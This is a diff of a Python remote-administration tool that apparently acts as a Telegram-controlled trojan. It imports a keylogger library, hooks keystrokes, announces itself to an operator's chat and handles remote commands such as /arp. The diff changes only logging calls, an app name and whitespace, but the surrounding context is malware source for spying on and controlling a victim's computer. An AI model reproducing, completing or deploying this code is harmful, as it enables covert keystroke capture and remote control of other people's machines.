@@ -27,7 +27,7 @@ import proxy
 import telepot, requests 								# telepot => telegram, requests => file download
 from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
 import pyHook, pythoncom 								# keylogger
-import socket											# internal IP
+import socket									# internal IP
 import getpass											# get username
 import collections
 import urllib# wallpaper
@@ -37,9 +37,9 @@ from ctypes import * #fixing pyinstaller - we need to import all the ctypes to g
 cd.log('i','Starting',True)
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'xx:xx' # you can set your environment variable as well
+token = 'xx:xx'
 # This will be used for setting paths and related file io -- change to whatever you want
-app_name = 'xx'
+app_name = 'ABCdef123'
 # ADD YOUR chat_id in string format TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']if 'TELEGRAM_CHAT_ID' in os.environ) 		# make sure to remove this line if you don't have this environment variable
@@ -172,7 +172,7 @@ def split_string(n, st):
 def send_safe_message(bot, chat_id, message):
 	while(True):
 		try:
-			cd.log('n','Message sent:\n{}'.format(bot.sendMessage(chat_id, message)))
+			cd.log('n','Message sent:\n{}'.format(bot.sendMessage(chat_id, message)),True)
 			break
 		except:
 			pass
@@ -182,7 +182,7 @@ def handle(msg):
         if checkchat_id(chat_id):
                 response = ''
                 if 'text' in msg:
-                        cd.log('n','\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n')
+                        cd.log('n','\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n',True)
                         command = msg['text']
                         if command == '/arp':
                                 response = ''
@@ -628,6 +628,7 @@ if len(known_ids) > 0:
 	helloWorld = platform.uname()[1] + ": I'm up."
 	for known_id in known_ids: send_safe_message(bot, known_id, helloWorld)
 	print(helloWorld)
+cd.log('s','Started',True)
 cd.log('i','Listening for commands on ' + platform.uname()[1] + '...',True)
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pressed_chars
